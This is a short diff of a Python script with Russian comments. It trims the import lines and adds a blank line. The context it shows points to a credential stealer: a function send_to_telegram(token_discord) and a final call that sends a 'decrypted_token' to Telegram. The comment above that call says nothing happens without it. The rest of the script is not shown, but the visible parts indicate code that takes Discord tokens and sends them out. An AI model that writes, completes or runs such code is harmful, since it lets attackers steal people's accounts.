@@ -1,4 +1,4 @@
-import os, requests, json # И любые другие модули, которые там используются
+import os
 import json
 import base64
 import re
@@ -58,3 +58,4 @@ def send_to_telegram(token_discord):
 # ВЫЗОВ ФУНКЦИИ (без этой строки ничего не произойдет!)
 
 send_to_telegram(decrypted_token)
+
